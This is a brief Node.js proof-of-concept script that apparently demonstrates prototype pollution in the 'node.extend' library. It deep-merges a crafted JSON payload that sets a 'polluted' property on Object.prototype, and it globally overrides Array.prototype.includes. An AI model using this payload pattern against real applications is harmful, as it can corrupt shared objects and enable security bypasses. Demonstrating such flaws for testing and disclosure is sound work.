Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
let extend = require('node.extend');
var obj = {};
console.log({}.polluted);
extend(true, {}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);